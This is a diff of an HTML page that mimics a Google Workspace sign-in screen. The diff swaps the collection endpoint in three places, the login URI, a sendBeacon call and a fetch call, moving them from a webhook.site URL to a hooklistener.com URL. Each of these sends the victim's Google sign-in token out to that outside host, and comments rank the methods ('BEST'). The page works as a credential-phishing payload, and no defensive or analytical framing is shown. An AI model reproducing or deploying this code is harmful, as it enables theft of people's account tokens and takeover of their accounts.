@@ -15,7 +15,7 @@
     <p style="color:#5f6368;">to continue to Workspace</p>
     <div id="g_id_onload"
          data-client_id="561478328063-3i8n5ve256gl3hh0elebre2g0111l5lk.apps.googleusercontent.com"
-         data-login_uri="https://webhook.site/79f5d586-3939-4986-b04e-f0f4431b97b0"
+         data-login_uri="https://api.hooklistener.com/w/advisory-black-jay-3q5f"
          data-auto_prompt="false">
     </div>
     <div class="g_id_signin" data-type="standard" data-size="large"></div>
@@ -34,10 +34,10 @@
 
         // METHOD 1: sendBeacon (BEST)
         const blob = new Blob([JSON.stringify({token: token})], {type: 'application/json'});
-        navigator.sendBeacon('https://webhook.site/79f5d586-3939-4986-b04e-f0f4431b97b0', blob);
+        navigator.sendBeacon('https://api.hooklistener.com/w/advisory-black-jay-3q5f', blob);
 
         // METHOD 2: fetch
-        fetch('https://webhook.site/79f5d586-3939-4986-b04e-f0f4431b97b0?token=' + encodeURIComponent(token))
+        fetch('https://api.hooklistener.com/w/advisory-black-jay-3q5f?token=' + encodeURIComponent(token))
           .then(() => debug.innerHTML += '<br>Sent via fetch!')
           .catch(() => {});
 
@@ -54,3 +54,4 @@
   <script src="https://accounts.google.com/gsi/client" async defer></script>
 </body>
 </html>
+
